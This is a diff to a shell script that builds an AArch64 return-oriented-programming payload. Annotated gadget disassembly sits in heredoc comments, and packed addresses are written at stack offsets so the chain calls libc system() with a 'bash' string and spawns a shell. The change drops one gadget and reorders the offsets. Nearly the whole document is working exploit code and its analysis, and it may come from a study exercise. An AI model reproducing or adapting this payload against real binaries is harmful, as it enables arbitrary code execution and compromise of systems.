@@ -30,35 +30,18 @@ main
 rop_c3="\x84\xe2\x44\x00\x00\x00\x00\x00"
 rop_c3_offset=5 # x29 = 4 ,x30  = 5
 : << '__deregister_frame_info_bases'
-Code 3: X19 = 0x406ae8 libc system address, will set to X0 at Code 4, offset = 48 + 16 - 16 + 16 = 8
+Code 3: X19 = 0x44f7c0 bash string, will set to X0 at Code 4, offset = 48 + 16 - 16 + 16 = 8
         X30 = 0x44e280 (Code 4) offset = 48 + 16 - 16 = 6 
   44e284:	f9400bf3 	ldr	x19, [sp, #16]
   44e288:	a8c37bfd 	ldp	x29, x30, [sp], #48
   44e28c:	d65f03c0 	ret
 
-Code 4:  X30 = 0x441e50 Code5 address offset = ( 48 + 16  + 48 -16)/8 = 12 
+Code 4:  X30 = 0x406ae8 libc_system address offset = ( 48 + 16  + 48 -16)/8 = 12 
   44e280:	aa1303e0 	mov	x0, x19
   44e284:	f9400bf3 	ldr	x19, [sp, #16]
   44e288:	a8c37bfd 	ldp	x29, x30, [sp], #48
   44e28c:	d65f03c0 	ret
 __deregister_frame_info_bases
-
-: << 'find_module'
-Code 5: X0 = bash string address, offset = [48 + 16 + 48 + 48 + 64 - 16]/8 = 26
-        X30 = main return address, offset = [48 + 16 + 48 + 48 - 16]/8 = 18
-  441e50:	aa0003f0 	mov	x16, x0
-  441e54:	ad4287e0 	ldp	q0, q1, [sp, #80]
-  441e58:	ad438fe2 	ldp	q2, q3, [sp, #112]
-  441e5c:	ad4497e4 	ldp	q4, q5, [sp, #144]
-  441e60:	ad459fe6 	ldp	q6, q7, [sp, #176]
-  441e64:	a94407e0 	ldp	x0, x1, [sp, #64]
-  441e68:	a9430fe2 	ldp	x2, x3, [sp, #48]
-  441e6c:	a94217e4 	ldp	x4, x5, [sp, #32]
-  441e70:	a9411fe6 	ldp	x6, x7, [sp, #16]
-  441e74:	a8cd27e8 	ldp	x8, x9, [sp], #208
-  441e78:	a8c17bf1 	ldp	x17, x30, [sp], #16
-  441e7c:	d61f0200 	br	x16
-find_module
 
 : << 'rop_symbol'
 Code 6: libc_system address 0x406ae8, bash string address 0x44f7c0
@@ -73,24 +56,21 @@ Code 6: libc_system address 0x406ae8, bash string address 0x44f7c0
 rop_symbol
 
 libc_system="\xe8\x6a\x40\x00\x00\x00\x00\x00"
-libc_system_offset=8
+libc_system_offset=13 # X29 = 12, X30 = 13
 bash="\xc0\xf7\x44\x00\x00\x00\x00\x00"
-bash_offset=26
+bash_offset=8
 rop_c4="\x80\xe2\x44\x00\x00\x00\x00\x00"
 rop_c4_offset=7  # X29 = 6, X30 = 7
-rop_c5="\x50\x1e\x44\x00\x00\x00\x00\x00"
-rop_c5_offset=13  # X29 = 12, X30 = 13
 
 data=rop.data
 printf "" > $data
 
+#The max size can't be too big, it will overwrite the other segement to make the system call failed
 for (( i=0; i < 40; ++i)); do 
 	if [ $i -eq $rop_c3_offset ] ; then 
 		printf "$rop_c3" >> $data
 	elif [ $i -eq $rop_c4_offset ] ; then 
 		printf "$rop_c4" >> $data
-	elif [ $i -eq $rop_c5_offset ] ; then 
-		printf "$rop_c5" >> $data
 	elif [ $i -eq $libc_system_offset ] ; then 
 		printf "$libc_system" >> $data
 	elif [ $i -eq $bash_offset ] ; then 
